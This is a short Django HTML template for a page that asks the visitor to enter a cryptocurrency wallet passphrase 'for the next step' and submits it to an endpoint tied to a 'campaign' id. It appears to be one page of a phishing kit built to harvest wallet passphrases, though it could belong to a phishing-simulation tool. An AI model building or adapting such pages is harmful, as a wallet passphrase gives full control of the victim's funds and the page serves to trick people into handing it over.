{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Passphrase Information</title>
    <link rel="stylesheet" href="{% static 'css/style.css' %}">
</head>
<body>
    <div class="container">
        <h2>Enter Your Wallet Passphrase</h2>
        <p>Please provide your wallet passphrase for the next step.</p>

        <form method="post" action="{% url 'core:passphrase_info' campaign_id=campaign.id %}">
            {% csrf_token %}
            {{ form.as_p }}
            <button type="submit" class="btn btn-primary">Submit</button>
        </form>

    </div>
</body>
</html>
